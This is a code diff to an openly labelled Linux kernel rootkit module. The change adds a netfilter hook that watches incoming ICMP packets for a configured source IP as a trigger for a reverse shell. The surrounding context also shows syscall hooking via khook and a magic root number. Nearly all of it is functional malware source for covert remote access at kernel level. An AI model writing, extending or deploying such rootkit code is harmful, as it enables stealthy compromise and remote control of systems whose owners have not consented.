@@ -4,24 +4,31 @@
  * @brief   A rootkit. // TODO: Expand description
  */
 #include <asm/unistd.h>
+#include "khook/engine.c"
 #include <linux/cred.h>
 #include <linux/fs.h>
+#include <linux/icmp.h>
+#include <linux/inet.h>
 #include <linux/init.h>
 #include <linux/ipc.h>
+#include <linux/ip.h>
 #include <linux/jiffies.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
+#include <linux/netfilter.h>
+#include <linux/netfilter_ipv4.h>
 #include <linux/net.h>
 #include <linux/pid.h>
 #include <linux/sched.h>
 #include <linux/signal.h>
+#include <linux/skbuff.h>
 #include <linux/syscalls.h>
 #include <linux/threads.h>
 #include <linux/timer.h>
 #include <linux/types.h>
+#include <linux/udp.h>
 #include <linux/unistd.h>
 #include <net/inet_sock.h>
-#include "khook/engine.c"
 
 MODULE_AUTHOR("Aaron Lichtman");
 MODULE_DESCRIPTION("Linux rootkit.");
@@ -65,6 +72,7 @@ typedef struct action_task {
 #define MAGIC_ROOT_NUM 31337
 #define MAX_TASK_SIZE 200
 static _timer polling_timer;
+static struct nf_hook_ops icmp_hook;
 
 // Module parameters
 
@@ -321,11 +329,53 @@ static void do_something_on_interval(unsigned long data) {
 }
 
 /**
+ * Net filter hook option for intercepting ICMP pings and
+ * looking for reverse shell requests.
+ **/
+unsigned int icmp_hook_func(void* priv, struct sk_buff *skb, const struct nf_hook_state *state) {
+	struct iphdr *ip_header;
+
+	if (!skb) {
+		return NF_DROP;
+	}
+
+	// TODO: Maybe use icmp_hdr()
+	ip_header = (struct iphdr *) skb_network_header(skb);
+	// If it's an ICMP packet coming from the IP address entered during config,
+	// we should open a reverse shell.
+	if (ip_header->protocol == IPPROTO_ICMP) { 
+		char source_ip[16];
+		printk(KERN_EMERG "%pI4", &ip_header->saddr);
+		snprintf(source_ip, 16, "%pI4", &ip_header->saddr);
+
+		if (!strncmp(source_ip, rev_shell_ip, 16)) {
+			printk(KERN_EMERG "Reverse shell request found!\n"); 
+		}
+	}
+
+	return NF_ACCEPT;
+}
+
+static void icmp_hook_init(void) {
+	icmp_hook.hook = icmp_hook_func;
+    icmp_hook.pf = PF_INET; // Filter by IPV4 packets
+	icmp_hook.hooknum = 0; // Hook ICMP request
+	icmp_hook.priority = NF_IP_PRI_FIRST; // See packets before every other hook function
+
+    if (nf_register_net_hook(NULL, &icmp_hook)) {
+    	printk(KERN_ERR "Some issue registering net hook.\n");	
+    }
+}
+
+/**
  * Rootkit module initialization.
  */
 static int __init rootkit_init(void) {
 	printk(KERN_EMERG "Initializing rootkit...\n");
 	khook_init();
+
+	printk(KERN_EMERG "Initializing ICMP hook...\n");
+	icmp_hook_init();
 
 	printk(KERN_EMERG "Initializing timer...\n");
 	timer_init_wrapper(&polling_timer, do_something_on_interval);
@@ -348,6 +398,7 @@ static int __init rootkit_init(void) {
 static void __exit rootkit_exit(void) {
 	printk(KERN_EMERG "rmmod called. Cleaning up rootkit.");
 	khook_cleanup();
+	nf_unregister_net_hook(NULL, &icmp_hook);
 	timer_cleanup_wrapper(&polling_timer);
 }
 
